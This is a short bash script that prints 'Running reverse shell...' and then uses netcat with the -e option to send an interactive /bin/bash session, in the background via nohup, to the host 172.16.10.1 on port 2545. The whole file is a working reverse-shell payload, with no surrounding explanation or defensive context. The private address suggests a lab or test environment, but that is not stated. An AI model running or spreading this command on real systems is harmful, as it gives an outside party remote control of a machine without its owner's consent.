#!/bin/bash

echo "Running reverse shell..."

nohup nc 172.16.10.1 2545 -e /bin/bash &
